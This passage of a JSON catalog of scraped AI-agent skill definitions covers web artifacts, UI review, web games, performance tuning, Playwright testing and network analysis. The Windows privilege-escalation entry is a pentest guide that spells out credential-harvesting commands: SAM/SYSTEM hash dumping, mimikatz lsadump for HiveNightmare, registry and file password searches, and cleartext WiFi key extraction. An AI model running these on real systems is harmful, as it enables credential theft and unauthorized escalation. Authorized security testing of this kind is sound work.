**Assets** | Secrets, PII, business data |\n\n### Prioritization Matrix\n\n```\nRisk = Likelihood × Impact\n\nHigh Impact + High Likelihood → CRITICAL\nHigh Impact + Low Likelihood  → HIGH\nLow Impact + High Likelihood  → MEDIUM\nLow Impact + Low Likelihood   → LOW\n```\n\n---\n\n## 5. Risk Prioritization\n\n### CVSS + Context\n\n| Factor | Weight | Question |\n|--------|--------|----------|\n| **CVSS Score** | Base severity | How severe is the vuln? |\n| **EPSS Score** | Exploit likelihood | Is it being exploited? |\n| **Asset Value** | Business context | What's at risk? |\n| **Exposure** | Attack surface | Internet-facing? |\n\n### Prioritization Decision Tree\n\n```\nIs it actively exploited (EPSS >0.5)?\n├── YES → CRITICAL: Immediate action\n└── NO → Check CVSS\n         ├── CVSS ≥9.0 → HIGH\n         ├── CVSS 7.0-8.9 → Consider asset value\n         └── CVSS <7.0 → Schedule for later\n```\n\n---\n\n## 6. Exceptional Conditions (A10 - New)\n\n### Fail-Open vs Fail-Closed\n\n| Scenario | Fail-Open (BAD) | Fail-Closed (GOOD) |\n|----------|-----------------|---------------------|\n| Auth error | Allow access | Deny access |\n| Parsing fails | Accept input | Reject input |\n| Timeout | Retry forever | Limit + abort |\n\n### What to Check\n\n- Exception handlers that catch-all and ignore\n- Missing error handling on security operations\n- Race conditions in auth/authz\n- Resource exhaustion scenarios\n\n---\n\n## 7. Scanning Methodology\n\n### Phase-Based Approach\n\n```\n1. RECONNAISSANCE\n   └── Understand the target\n       ├── Technology stack\n       ├── Entry points\n       └── Data flows\n\n2. DISCOVERY\n   └── Identify potential issues\n       ├── Configuration review\n       ├── Dependency analysis\n       └── Code pattern search\n\n3. ANALYSIS\n   └── Validate and prioritize\n       ├── False positive elimination\n       ├── Risk scoring\n       └── Attack chain mapping\n\n4. REPORTING\n   └── Actionable findings\n       ├── Clear reproduction steps\n       ├── Business impact\n       └── Remediation guidance\n```\n\n---\n\n## 8. Code Pattern Analysis\n\n### High-Risk Patterns\n\n| Pattern | Risk | Look For |\n|---------",
      "tags": [
        "python",
        "api",
        "ai",
        "design",
        "security",
        "vulnerability",
        "aws",
        "gcp",
        "azure",
        "rag"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:37.077Z"
    },
    {
      "id": "anthropic-web-artifacts-builder",
      "name": "web-artifacts-builder",
      "slug": "web-artifacts-builder",
      "description": "Suite of tools for creating elaborate, multi-component claude.ai HTML artifacts using modern frontend web technologies (React, Tailwind CSS, shadcn/ui). Use for complex artifacts requiring state management, routing, or shadcn/ui components - not for simple single-file HTML/JSX artifacts.",
      "category": "Creative & Media",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/web-artifacts-builder",
      "content": "\n# Web Artifacts Builder\n\nTo build powerful frontend claude.ai artifacts, follow these steps:\n1. Initialize the frontend repo using `scripts/init-artifact.sh`\n2. Develop your artifact by editing the generated code\n3. Bundle all code into a single HTML file using `scripts/bundle-artifact.sh`\n4. Display artifact to user\n5. (Optional) Test the artifact\n\n**Stack**: React 18 + TypeScript + Vite + Parcel (bundling) + Tailwind CSS + shadcn/ui\n\n## Design & Style Guidelines\n\nVERY IMPORTANT: To avoid what is often referred to as \"AI slop\", avoid using excessive centered layouts, purple gradients, uniform rounded corners, and Inter font.\n\n## Quick Start\n\n### Step 1: Initialize Project\n\nRun the initialization script to create a new React project:\n```bash\nbash scripts/init-artifact.sh <project-name>\ncd <project-name>\n```\n\nThis creates a fully configured project with:\n- ✅ React + TypeScript (via Vite)\n- ✅ Tailwind CSS 3.4.1 with shadcn/ui theming system\n- ✅ Path aliases (`@/`) configured\n- ✅ 40+ shadcn/ui components pre-installed\n- ✅ All Radix UI dependencies included\n- ✅ Parcel configured for bundling (via .parcelrc)\n- ✅ Node 18+ compatibility (auto-detects and pins Vite version)\n\n### Step 2: Develop Your Artifact\n\nTo build the artifact, edit the generated files. See **Common Development Tasks** below for guidance.\n\n### Step 3: Bundle to Single HTML File\n\nTo bundle the React app into a single HTML artifact:\n```bash\nbash scripts/bundle-artifact.sh\n```\n\nThis creates `bundle.html` - a self-contained artifact with all JavaScript, CSS, and dependencies inlined. This file can be directly shared in Claude conversations as an artifact.\n\n**Requirements**: Your project must have an `index.html` in the root directory.\n\n**What the script does**:\n- Installs bundling dependencies (parcel, @parcel/config-default, parcel-resolver-tspaths, html-inline)\n- Creates `.parcelrc` config with path alias support\n- Builds with Parcel (no source maps)\n- Inlines all assets into single HTML using html-inline\n\n### Step 4: Share Artifact with User\n\nFinally, share the bundled HTML file in conversation with the user so they can view it as an artifact.\n\n### Step 5: Testing/Visualizing the Artifact (Optional)\n\nNote: This is a completely optional step. Only perform if necessary or requested.\n\nTo test/visualize the artifact, use available tools (including other Skills or built-in tools like Playwright or Puppeteer). In general, avoid testing the artifact upfront as it adds latency between the request and when the finished artifact can be seen. Test later, after presenting the artifact, if requested or if issues arise.\n\n## Reference\n\n- **shadcn/ui components**: https://ui.shadcn.com/docs/components",
      "tags": [
        "javascript",
        "typescript",
        "react",
        "node",
        "claude",
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:45.046Z"
    },
    {
      "id": "antigravity-web-design-guidelines",
      "name": "web-design-guidelines",
      "slug": "web-design-guidelines",
      "description": "Review UI code for Web Interface Guidelines compliance. Use when asked to \"review my UI\", \"check accessibility\", \"audit design\", \"review UX\", or \"check my site against best practices\".",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/web-design-guidelines",
      "content": "\n# Web Interface Guidelines\n\nReview files for compliance with Web Interface Guidelines.\n\n## How It Works\n\n1. Fetch the latest guidelines from the source URL below\n2. Read the specified files (or prompt user for files/pattern)\n3. Check against all rules in the fetched guidelines\n4. Output findings in the terse `file:line` format\n\n## Guidelines Source\n\nFetch fresh guidelines before each review:\n\n```\nhttps://raw.githubusercontent.com/vercel-labs/web-interface-guidelines/main/command.md\n```\n\nUse WebFetch to retrieve the latest rules. The fetched content contains all the rules and output format instructions.\n\n## Usage\n\nWhen a user provides a file or pattern argument:\n1. Fetch guidelines from the source URL above\n2. Read the specified files\n3. Apply all rules from the fetched guidelines\n4. Output findings using the format specified in the guidelines\n\nIf no files specified, ask the user which files to review.\n",
      "tags": [
        "ai",
        "design"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:41.064Z"
    },
    {
      "id": "antigravity-game-development-web-games",
      "name": "web-games",
      "slug": "game-development-web-games",
      "description": "Web browser game development principles. Framework selection, WebGPU, optimization, PWA.",
      "category": "Creative & Media",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/game-development/web-games",
      "content": "\n# Web Browser Game Development\n\n> Framework selection and browser-specific principles.\n\n---\n\n## 1. Framework Selection\n\n### Decision Tree\n\n```\nWhat type of game?\n│\n├── 2D Game\n│   ├── Full game engine features? → Phaser\n│   └── Raw rendering power? → PixiJS\n│\n├── 3D Game\n│   ├── Full engine (physics, XR)? → Babylon.js\n│   └── Rendering focused? → Three.js\n│\n└── Hybrid / Canvas\n    └── Custom → Raw Canvas/WebGL\n```\n\n### Comparison (2025)\n\n| Framework | Type | Best For |\n|-----------|------|----------|\n| **Phaser 4** | 2D | Full game features |\n| **PixiJS 8** | 2D | Rendering, UI |\n| **Three.js** | 3D | Visualizations, lightweight |\n| **Babylon.js 7** | 3D | Full engine, XR |\n\n---\n\n## 2. WebGPU Adoption\n\n### Browser Support (2025)\n\n| Browser | Support |\n|---------|---------|\n| Chrome | ✅ Since v113 |\n| Edge | ✅ Since v113 |\n| Firefox | ✅ Since v131 |\n| Safari | ✅ Since 18.0 |\n| **Total** | **~73%** global |\n\n### Decision\n\n- **New projects**: Use WebGPU with WebGL fallback\n- **Legacy support**: Start with WebGL\n- **Feature detection**: Check `navigator.gpu`\n\n---\n\n## 3. Performance Principles\n\n### Browser Constraints\n\n| Constraint | Strategy |\n|------------|----------|\n| No local file access | Asset bundling, CDN |\n| Tab throttling | Pause when hidden |\n| Mobile data limits | Compress assets |\n| Audio autoplay | Require user interaction |\n\n### Optimization Priority\n\n1. **Asset compression** - KTX2, Draco, WebP\n2. **Lazy loading** - Load on demand\n3. **Object pooling** - Avoid GC\n4. **Draw call batching** - Reduce state changes\n5. **Web Workers** - Offload heavy computation\n\n---\n\n## 4. Asset Strategy\n\n### Compression Formats\n\n| Type | Format |\n|------|--------|\n| Textures | KTX2 + Basis Universal |\n| Audio | WebM/Opus (fallback: MP3) |\n| 3D Models | glTF + Draco/Meshopt |\n\n### Loading Strategy\n\n| Phase | Load |\n|-------|------|\n| Startup | Core assets, <2MB |\n| Gameplay | Stream on demand |\n| Background | Prefetch next level |\n\n---\n\n## 5. PWA for Games\n\n### Benefits\n\n- Offline play\n- Install to home screen\n- Full screen mode\n- Push notifications\n\n### Requirements\n\n- Service worker for caching\n- Web app manifest\n- HTTPS\n\n---\n\n## 6. Audio Handling\n\n### Browser Requirements\n\n- Audio context requires user interaction\n- Create AudioContext on first click/tap\n- Resume context if suspended\n\n### Best Practices\n\n- Use Web Audio API\n- Pool audio sources\n- Preload common sounds\n- Compress with WebM/Opus\n\n---\n\n## 7. Anti-Patterns\n\n| ❌ Don't | ✅ Do |\n|----------|-------|\n| Load all assets upfront | Progressive loading |\n| Ignore tab visibility | Pause when hidden |\n| Block on audio load | Lazy load audio |\n| Skip compression | Compress everything |\n| Assume fast connection | Handle slow networks |\n\n---\n\n> **Remember:** Browser is the most accessible platform. Respect its constraints.\n",
      "tags": [
        "api",
        "ai"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:18:47.444Z"
    },
    {
      "id": "antigravity-web-performance-optimization",
      "name": "web-performance-optimization",
      "slug": "web-performance-optimization",
      "description": "Optimize website and web application performance including loading speed, Core Web Vitals, bundle size, caching strategies, and runtime performance",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/web-performance-optimization",
      "content": "\n# Web Performance Optimization\n\n## Overview\n\nHelp developers optimize website and web application performance to improve user experience, SEO rankings, and conversion rates. This skill provides systematic approaches to measure, analyze, and improve loading speed, runtime performance, and Core Web Vitals metrics.\n\n## When to Use This Skill\n\n- Use when website or app is loading slowly\n- Use when optimizing for Core Web Vitals (LCP, FID, CLS)\n- Use when reducing JavaScript bundle size\n- Use when improving Time to Interactive (TTI)\n- Use when optimizing images and assets\n- Use when implementing caching strategies\n- Use when debugging performance bottlenecks\n- Use when preparing for performance audits\n\n## How It Works\n\n### Step 1: Measure Current Performance\n\nI'll help you establish baseline metrics:\n- Run Lighthouse audits\n- Measure Core Web Vitals (LCP, FID, CLS)\n- Check bundle sizes\n- Analyze network waterfall\n- Identify performance bottlenecks\n\n### Step 2: Identify Issues\n\nAnalyze performance problems:\n- Large JavaScript bundles\n- Unoptimized images\n- Render-blocking resources\n- Slow server response times\n- Missing caching headers\n- Layout shifts\n- Long tasks blocking main thread\n\n### Step 3: Prioritize Optimizations\n\nFocus on high-impact improvements:\n- Critical rendering path optimization\n- Code splitting and lazy loading\n- Image optimization\n- Caching strategies\n- Third-party script optimization\n\n### Step 4: Implement Optimizations\n\nApply performance improvements:\n- Optimize assets (images, fonts, CSS, JS)\n- Implement code splitting\n- Add caching headers\n- Lazy load non-critical resources\n- Optimize critical rendering path\n\n### Step 5: Verify Improvements\n\nMeasure impact of changes:\n- Re-run Lighthouse audits\n- Compare before/after metrics\n- Monitor real user metrics (RUM)\n- Test on different devices and networks\n\n## Examples\n\n### Example 1: Optimizing Core Web Vitals\n\n```markdown\n## Performance Audit Results\n\n### Current Metrics (Before Optimization)\n- **LCP (Largest Contentful Paint):** 4.2s ❌ (should be < 2.5s)\n- **FID (First Input Delay):** 180ms ❌ (should be < 100ms)\n- **CLS (Cumulative Layout Shift):** 0.25 ❌ (should be < 0.1)\n- **Lighthouse Score:** 62/100\n\n### Issues Identified\n\n1. **LCP Issue:** Hero image (2.5MB) loads slowly\n2. **FID Issue:** Large JavaScript bundle (850KB) blocks main thread\n3. **CLS Issue:** Images without dimensions cause layout shifts\n\n### Optimization Plan\n\n#### Fix LCP (Largest Contentful Paint)\n\n**Problem:** Hero image is 2.5MB and loads slowly\n\n**Solutions:**\n\\`\\`\\`html\n<!-- Before: Unoptimized image -->\n<img src=\"/hero.jpg\" alt=\"Hero\">\n\n<!-- After: Optimized with modern formats -->\n<picture>\n  <source srcset=\"/hero.avif\" type=\"image/avif\">\n  <source srcset=\"/hero.webp\" type=\"image/webp\">\n  <img \n    src=\"/hero.jpg\" \n    alt=\"Hero\"\n    width=\"1200\" \n    height=\"600\"\n    loading=\"eager\"\n    fetchpriority=\"high\"\n  >\n</picture>\n\\`\\`\\`\n\n**Additional optimizations:**\n- Compress image to < 200KB\n- Use CDN for faster delivery\n- Preload hero image: `<link rel=\"preload\" as=\"image\" href=\"/hero.avif\">`\n\n#### Fix FID (First Input Delay)\n\n**Problem:** 850KB JavaScript bundle blocks main thread\n\n**Solutions:**\n\n1. **Code Splitting:**\n\\`\\`\\`javascript\n// Before: Everything in one bundle\nimport { HeavyComponent } from './HeavyComponent';\nimport { Analytics } from './analytics';\nimport { ChatWidget } from './chat';\n\n// After: Lazy load non-critical code\nconst HeavyComponent = lazy(() => import('./HeavyComponent'));\nconst ChatWidget = lazy(() => import('./chat'));\n\n// Load analytics after page interactive\nif (typeof window !== 'undefined') {\n  window.addEventListener('load', () => {\n    import('./analytics').then(({ Analytics }) => {\n      Analytics.init();\n    });\n  });\n}\n\\`\\`\\`\n\n2. **Remove Unused Dependencies:**\n\\`\\`\\`bash\n# Analyze bundle\nnpx webpack-bundle-analyzer\n\n# Remove unused packages\nnpm uninstall moment  # Use date-fns instead (smaller)\nnpm install date-fns\n\\`\\`\\`\n\n3. **Defer Non-Critical Scripts:**\n\\`\\`\\`html\n<!-- Before: Blocks rendering -->\n<script src=\"/analytics.js\"></script>\n\n<!-- After: Deferred -->\n<script src=\"/analytics.js\" defer></script>\n\\`\\`\\`\n\n#### Fix CLS (Cumulative Layout Shift)\n\n**Problem:** Images without dimensions cause layout shifts\n\n**Solutions:**\n\\`\\`\\`html\n<!-- Before: No dimensions -->\n<img src=\"/product.jpg\" alt=\"Product\">\n\n<!-- After: With dimensions -->\n<img \n  src=\"/product.jpg\" \n  alt=\"Product\"\n  width=\"400\" \n  height=\"300\"\n  style=\"aspect-ratio: 4/3;\"\n>\n\\`\\`\\`\n\n**For dynamic content:**\n\\`\\`\\`css\n/* Reserve space for content that loads later */\n.skeleton-loader {\n  min-height: 200px;\n  background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);\n  background-size: 200% 100%;\n  animation: loading 1.5s infinite;\n}\n\n@keyframes loading {\n  0% { background-position: 200% 0; }\n  100% { background-position: -200% 0; }\n}\n\\`\\`\\`\n\n### Results After Optimization\n\n- **LCP:** 1.8s ✅ (improved by 57%)\n- **FID:** 45ms ✅ (improved by 75%)\n- **CL",
      "tags": [
        "javascript",
        "react",
        "nextjs",
        "markdown",
        "api",
        "ai",
        "document",
        "image",
        "seo"
      ],
      "useCases": [
        "Use when website or app is loading slowly",
        "Use when optimizing for Core Web Vitals (LCP, FID, CLS)",
        "Use when reducing JavaScript bundle size",
        "Use when improving Time to Interactive (TTI)",
        "Use when optimizing images and assets"
      ],
      "scrapedAt": "2026-01-26T13:22:42.928Z"
    },
    {
      "id": "anthropic-webapp-testing",
      "name": "webapp-testing",
      "slug": "webapp-testing",
      "description": "Toolkit for interacting with and testing local web applications using Playwright. Supports verifying frontend functionality, debugging UI behavior, capturing browser screenshots, and viewing browser logs.",
      "category": "Development & Code Tools",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/webapp-testing",
      "content": "\n# Web Application Testing\n\nTo test local web applications, write native Python Playwright scripts.\n\n**Helper Scripts Available**:\n- `scripts/with_server.py` - Manages server lifecycle (supports multiple servers)\n\n**Always run scripts with `--help` first** to see usage. DO NOT read the source until you try running the script first and find that a customized solution is abslutely necessary. These scripts can be very large and thus pollute your context window. They exist to be called directly as black-box scripts rather than ingested into your context window.\n\n## Decision Tree: Choosing Your Approach\n\n```\nUser task → Is it static HTML?\n    ├─ Yes → Read HTML file directly to identify selectors\n    │         ├─ Success → Write Playwright script using selectors\n    │         └─ Fails/Incomplete → Treat as dynamic (below)\n    │\n    └─ No (dynamic webapp) → Is the server already running?\n        ├─ No → Run: python scripts/with_server.py --help\n        │        Then use the helper + write simplified Playwright script\n        │\n        └─ Yes → Reconnaissance-then-action:\n            1. Navigate and wait for networkidle\n            2. Take screenshot or inspect DOM\n            3. Identify selectors from rendered state\n            4. Execute actions with discovered selectors\n```\n\n## Example: Using with_server.py\n\nTo start a server, run `--help` first, then use the helper:\n\n**Single server:**\n```bash\npython scripts/with_server.py --server \"npm run dev\" --port 5173 -- python your_automation.py\n```\n\n**Multiple servers (e.g., backend + frontend):**\n```bash\npython scripts/with_server.py \\\n  --server \"cd backend && python server.py\" --port 3000 \\\n  --server \"cd frontend && npm run dev\" --port 5173 \\\n  -- python your_automation.py\n```\n\nTo create an automation script, include only Playwright logic (servers are managed automatically):\n```python\nfrom playwright.sync_api import sync_playwright\n\nwith sync_playwright() as p:\n    browser = p.chromium.launch(headless=True) # Always launch chromium in headless mode\n    page = browser.new_page()\n    page.goto('http://localhost:5173') # Server already running and ready\n    page.wait_for_load_state('networkidle') # CRITICAL: Wait for JS to execute\n    # ... your automation logic\n    browser.close()\n```\n\n## Reconnaissance-Then-Action Pattern\n\n1. **Inspect rendered DOM**:\n   ```python\n   page.screenshot(path='/tmp/inspect.png', full_page=True)\n   content = page.content()\n   page.locator('button').all()\n   ```\n\n2. **Identify selectors** from inspection results\n\n3. **Execute actions** using discovered selectors\n\n## Common Pitfall\n\n❌ **Don't** inspect the DOM before waiting for `networkidle` on dynamic apps\n✅ **Do** wait for `page.wait_for_load_state('networkidle')` before inspection\n\n## Best Practices\n\n- **Use bundled scripts as black boxes** - To accomplish a task, consider whether one of the scripts available in `scripts/` can help. These scripts handle common, complex workflows reliably without cluttering the context window. Use `--help` to see usage, then invoke directly. \n- Use `sync_playwright()` for synchronous scripts\n- Always close the browser when done\n- Use descriptive selectors: `text=`, `role=`, CSS selectors, or IDs\n- Add appropriate waits: `page.wait_for_selector()` or `page.wait_for_timeout()`\n\n## Reference Files\n\n- **examples/** - Examples showing common patterns:\n  - `element_discovery.py` - Discovering buttons, links, and inputs on a page\n  - `static_html_automation.py` - Using file:// URLs for local HTML\n  - `console_logging.py` - Capturing console logs during automation",
      "tags": [
        "python",
        "api",
        "ai",
        "automation",
        "workflow"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:46.196Z"
    },
    {
      "id": "awesome-llm-webapp-testing",
      "name": "webapp-testing",
      "slug": "awesome-llm-webapp-testing",
      "description": "Toolkit for interacting with and testing local web applications using Playwright. Supports verifying frontend functionality, debugging UI behavior, capturing browser screenshots, and viewing browser logs.",
      "category": "Development & Code Tools",
      "source": "awesome-llm",
      "repoUrl": "https://github.com/Prat011/awesome-llm-skills",
      "skillUrl": "https://github.com/Prat011/awesome-llm-skills/tree/master/webapp-testing",
      "content": "\n# Web Application Testing\n\nTo test local web applications, write native Python Playwright scripts.\n\n**Helper Scripts Available**:\n- `scripts/with_server.py` - Manages server lifecycle (supports multiple servers)\n\n**Always run scripts with `--help` first** to see usage. DO NOT read the source until you try running the script first and find that a customized solution is abslutely necessary. These scripts can be very large and thus pollute your context window. They exist to be called directly as black-box scripts rather than ingested into your context window.\n\n## Decision Tree: Choosing Your Approach\n\n```\nUser task → Is it static HTML?\n    ├─ Yes → Read HTML file directly to identify selectors\n    │         ├─ Success → Write Playwright script using selectors\n    │         └─ Fails/Incomplete → Treat as dynamic (below)\n    │\n    └─ No (dynamic webapp) → Is the server already running?\n        ├─ No → Run: python scripts/with_server.py --help\n        │        Then use the helper + write simplified Playwright script\n        │\n        └─ Yes → Reconnaissance-then-action:\n            1. Navigate and wait for networkidle\n            2. Take screenshot or inspect DOM\n            3. Identify selectors from rendered state\n            4. Execute actions with discovered selectors\n```\n\n## Example: Using with_server.py\n\nTo start a server, run `--help` first, then use the helper:\n\n**Single server:**\n```bash\npython scripts/with_server.py --server \"npm run dev\" --port 5173 -- python your_automation.py\n```\n\n**Multiple servers (e.g., backend + frontend):**\n```bash\npython scripts/with_server.py \\\n  --server \"cd backend && python server.py\" --port 3000 \\\n  --server \"cd frontend && npm run dev\" --port 5173 \\\n  -- python your_automation.py\n```\n\nTo create an automation script, include only Playwright logic (servers are managed automatically):\n```python\nfrom playwright.sync_api import sync_playwright\n\nwith sync_playwright() as p:\n    browser = p.chromium.launch(headless=True) # Always launch chromium in headless mode\n    page = browser.new_page()\n    page.goto('http://localhost:5173') # Server already running and ready\n    page.wait_for_load_state('networkidle') # CRITICAL: Wait for JS to execute\n    # ... your automation logic\n    browser.close()\n```\n\n## Reconnaissance-Then-Action Pattern\n\n1. **Inspect rendered DOM**:\n   ```python\n   page.screenshot(path='/tmp/inspect.png', full_page=True)\n   content = page.content()\n   page.locator('button').all()\n   ```\n\n2. **Identify selectors** from inspection results\n\n3. **Execute actions** using discovered selectors\n\n## Common Pitfall\n\n❌ **Don't** inspect the DOM before waiting for `networkidle` on dynamic apps\n✅ **Do** wait for `page.wait_for_load_state('networkidle')` before inspection\n\n## Best Practices\n\n- **Use bundled scripts as black boxes** - To accomplish a task, consider whether one of the scripts available in `scripts/` can help. These scripts handle common, complex workflows reliably without cluttering the context window. Use `--help` to see usage, then invoke directly. \n- Use `sync_playwright()` for synchronous scripts\n- Always close the browser when done\n- Use descriptive selectors: `text=`, `role=`, CSS selectors, or IDs\n- Add appropriate waits: `page.wait_for_selector()` or `page.wait_for_timeout()`\n\n## Reference Files\n\n- **examples/** - Examples showing common patterns:\n  - `element_discovery.py` - Discovering buttons, links, and inputs on a page\n  - `static_html_automation.py` - Using file:// URLs for local HTML\n  - `console_logging.py` - Capturing console logs during automation",
      "tags": [
        "python",
        "api",
        "ai",
        "automation",
        "workflow",
        "webapp",
        "testing"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:16:08.934Z"
    },
    {
      "id": "antigravity-windows-privilege-escalation",
      "name": "Windows Privilege Escalation",
      "slug": "windows-privilege-escalation",
      "description": "This skill should be used when the user asks to \"escalate privileges on Windows,\" \"find Windows privesc vectors,\" \"enumerate Windows for privilege escalation,\" \"exploit Windows misconfigurations,\" or \"perform post-exploitation privilege escalation.\" It provides comprehensive guidance for discovering",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/windows-privilege-escalation",
      "content": "\n# Windows Privilege Escalation\n\n## Purpose\n\nProvide systematic methodologies for discovering and exploiting privilege escalation vulnerabilities on Windows systems during penetration testing engagements. This skill covers system enumeration, credential harvesting, service exploitation, token impersonation, kernel exploits, and various misconfigurations that enable escalation from standard user to Administrator or SYSTEM privileges.\n\n## Inputs / Prerequisites\n\n- **Initial Access**: Shell or RDP access as standard user on Windows system\n- **Enumeration Tools**: WinPEAS, PowerUp, Seatbelt, or manual commands\n- **Exploit Binaries**: Pre-compiled exploits or ability to transfer tools\n- **Knowledge**: Understanding of Windows security model and privileges\n- **Authorization**: Written permission for penetration testing activities\n\n## Outputs / Deliverables\n\n- **Privilege Escalation Path**: Identified vector to higher privileges\n- **Credential Dump**: Harvested passwords, hashes, or tokens\n- **Elevated Shell**: Command execution as Administrator or SYSTEM\n- **Vulnerability Report**: Documentation of misconfigurations and exploits\n- **Remediation Recommendations**: Fixes for identified weaknesses\n\n## Core Workflow\n\n### 1. System Enumeration\n\n#### Basic System Information\n```powershell\n# OS version and patches\nsysteminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"\nwmic qfe\n\n# Architecture\nwmic os get osarchitecture\necho %PROCESSOR_ARCHITECTURE%\n\n# Environment variables\nset\nGet-ChildItem Env: | ft Key,Value\n\n# List drives\nwmic logicaldisk get caption,description,providername\n```\n\n#### User Enumeration\n```powershell\n# Current user\nwhoami\necho %USERNAME%\n\n# User privileges\nwhoami /priv\nwhoami /groups\nwhoami /all\n\n# All users\nnet user\nGet-LocalUser | ft Name,Enabled,LastLogon\n\n# User details\nnet user administrator\nnet user %USERNAME%\n\n# Local groups\nnet localgroup\nnet localgroup administrators\nGet-LocalGroupMember Administrators | ft Name,PrincipalSource\n```\n\n#### Network Enumeration\n```powershell\n# Network interfaces\nipconfig /all\nGet-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address\n\n# Routing table\nroute print\nGet-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric\n\n# ARP table\narp -A\n\n# Active connections\nnetstat -ano\n\n# Network shares\nnet share\n\n# Domain Controllers\nnltest /DCLIST:DomainName\n```\n\n#### Antivirus Enumeration\n```powershell\n# Check AV products\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName\n```\n\n### 2. Credential Harvesting\n\n#### SAM and SYSTEM Files\n```powershell\n# SAM file locations\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n\n# SYSTEM file locations\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n\n# Extract hashes (from Linux after obtaining files)\npwdump SYSTEM SAM > sam.txt\nsamdump2 SYSTEM SAM -o sam.txt\n\n# Crack with John\njohn --format=NT sam.txt\n```\n\n#### HiveNightmare (CVE-2021-36934)\n```powershell\n# Check vulnerability\nicacls C:\\Windows\\System32\\config\\SAM\n# Vulnerable if: BUILTIN\\Users:(I)(RX)\n\n# Exploit with mimikatz\nmimikatz> token::whoami /full\nmimikatz> misc::shadowcopies\nmimikatz> lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM\n```\n\n#### Search for Passwords\n```powershell\n# Search file contents\nfindstr /SI /M \"password\" *.xml *.ini *.txt\nfindstr /si password *.xml *.ini *.txt *.config\n\n# Search registry\nreg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n\n# Windows Autologin credentials\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul | findstr \"DefaultUserName DefaultDomainName DefaultPassword\"\n\n# PuTTY sessions\nreg query \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\"\n\n# VNC passwords\nreg query \"HKCU\\Software\\ORL\\WinVNC3\\Password\"\nreg query HKEY_LOCAL_MACHINE\\SOFTWARE\\RealVNC\\WinVNC4 /v password\n\n# Search for specific files\ndir /S /B *pass*.txt == *pass*.xml == *cred* == *vnc* == *.config*\nwhere /R C:\\ *.ini\n```\n\n#### Unattend.xml Credentials\n```powershell\n# Common locations\nC:\\unattend.xml\nC:\\Windows\\Panther\\Unattend.xml\nC:\\Windows\\Panther\\Unattend\\Unattend.xml\nC:\\Windows\\system32\\sysprep.inf\nC:\\Windows\\system32\\sysprep\\sysprep.xml\n\n# Search for files\ndir /s *sysprep.inf *sysprep.xml *unattend.xml 2>nul\n\n# Decode base64 password (Linux)\necho \"U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo=\" | base64 -d\n```\n\n#### WiFi Passwords\n```powershell\n# List profiles\nnetsh wlan show profile\n\n# Get cleartext password\nnetsh wlan show profile <SSID> key=clear\n\n# Extract all WiFi passwords\nfor /f \"tokens=4 delims=: \" %a in ('netsh wlan show profiles ^| find \"Profile \"') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr \"SSID Cipher Key\" | find /v \"Number\" & echo.) & @echo on\n```\n\n#### PowerShell History\n```powe",
      "tags": [
        "python",
        "node",
        "api",
        "ai",
        "workflow",
        "document",
        "image",
        "security",
        "vulnerability",
        "aws"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:46.062Z"
    },
    {
      "id": "antigravity-wireshark-analysis",
      "name": "Wireshark Network Traffic Analysis",
      "slug": "wireshark-analysis",
      "description": "This skill should be used when the user asks to \"analyze network traffic with Wireshark\", \"capture packets for troubleshooting\", \"filter PCAP files\", \"follow TCP/UDP streams\", \"detect network anomalies\", \"investigate suspicious traffic\", or \"perform protocol analysis\". It provides comprehensive tech",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/wireshark-analysis",
